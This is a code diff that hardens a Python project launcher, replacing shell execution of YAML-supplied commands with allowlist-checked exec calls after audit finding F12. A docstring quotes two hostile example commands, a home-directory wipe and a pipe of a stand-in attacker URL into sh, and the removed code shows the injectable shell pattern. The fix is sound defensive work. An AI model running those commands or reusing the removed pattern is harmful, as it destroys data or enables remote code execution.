@@ -14,8 +14,10 @@ from __future__ import annotations
 import asyncio
 import logging
 import sys
+from collections.abc import Sequence
 from pathlib import Path
 
+from cortex.libs.utils.shell_allowlist import validate_command
 from cortex.services.launcher.project_config import ProjectConfig
 
 logger = logging.getLogger(__name__)
@@ -34,9 +36,20 @@ class ProjectLauncher:
         await launcher.launch("OS Project 3")
     """
 
-    def __init__(self, storage_path: str = "./storage") -> None:
+    def __init__(
+        self,
+        storage_path: str = "./storage",
+        *,
+        user_command_allowlist: Sequence[str] | None = None,
+    ) -> None:
         self._storage_path = Path(storage_path)
         self._is_macos = sys.platform == "darwin"
+        # Audit F12: power users can extend the built-in shell allowlist
+        # via ``LauncherConfig.user_command_allowlist``; the daemon
+        # threads that list in here at construction time.
+        self._user_command_allowlist: tuple[str, ...] = tuple(
+            user_command_allowlist or ()
+        )
 
     async def launch(self, project_name: str) -> dict:
         """
@@ -70,10 +83,10 @@ class ProjectLauncher:
             ok = await self._open_chrome_url(url)
             results["steps"].append({"action": "open_url", "url": url, "success": ok})
 
-        # Step 3: Run terminal commands
+        # Step 3: Run terminal commands (audit F12: allowlist-gated)
         for cmd in config.terminal_commands:
-            ok = await self._run_terminal_command(cmd)
-            results["steps"].append({"action": "run_command", "command": cmd, "success": ok})
+            step = await self._run_terminal_command(cmd)
+            results["steps"].append(step)
 
         # Step 4: Hide distraction apps
         for app in config.hide_apps:
@@ -147,20 +160,67 @@ class ProjectLauncher:
             logger.debug("Failed to open URL: %s", url)
             return False
 
-    async def _run_terminal_command(self, command: str) -> bool:
-        """Run a terminal command in the background."""
-        try:
-            await asyncio.create_subprocess_shell(
+    async def _run_terminal_command(self, command: str) -> dict:
+        """Run a terminal command in the background.
+
+        Audit F12: the legacy implementation passed ``command`` straight
+        to :func:`asyncio.create_subprocess_shell`. A hostile project
+        YAML could therefore inject arbitrary shell (``rm -rf ~``,
+        ``curl evil.tld | sh``). We now tokenise via
+        :func:`cortex.libs.utils.shell_allowlist.validate_command`,
+        reject anything whose binary is not on the editor/terminal
+        allowlist (extensible via ``LauncherConfig.user_command_allowlist``),
+        and dispatch with :func:`asyncio.create_subprocess_exec` so no
+        shell ever sees the user-supplied string.
+
+        Returns a step record:
+
+        * ``{"action": "run_command", "command": <cmd>, "success": True}``
+          on a successful spawn.
+        * ``{"action": "run_command", "command": <cmd>, "success": False,
+          "error": "unsupported_command"}`` when the command is rejected.
+          The ``command`` field is the original quoted string so the UI
+          can surface it back to the user verbatim.
+        """
+        argv, error = validate_command(
+            command,
+            allowlist=self._user_command_allowlist or None,
+        )
+        if error is not None:
+            logger.warning(
+                "Rejected unsupported terminal command: %r (%s)",
                 command,
+                error,
+            )
+            return {
+                "action": "run_command",
+                "command": command,
+                "success": False,
+                "error": "unsupported_command",
+                "reason": error,
+            }
+
+        try:
+            await asyncio.create_subprocess_exec(
+                *argv,
                 stdout=asyncio.subprocess.DEVNULL,
                 stderr=asyncio.subprocess.DEVNULL,
             )
             # Don't wait for completion — some commands are long-running (docker)
             await asyncio.sleep(1.0)
-            return True
-        except Exception:
-            logger.debug("Failed to run command: %s", command)
-            return False
+            return {
+                "action": "run_command",
+                "command": command,
+                "success": True,
+            }
+        except Exception as exc:
+            logger.debug("Failed to run command: %s (%s)", command, exc)
+            return {
+                "action": "run_command",
+                "command": command,
+                "success": False,
+                "error": "spawn_failed",
+            }
 
     async def _hide_app(self, app_name: str) -> bool:
         """Hide an application using macOS osascript."""
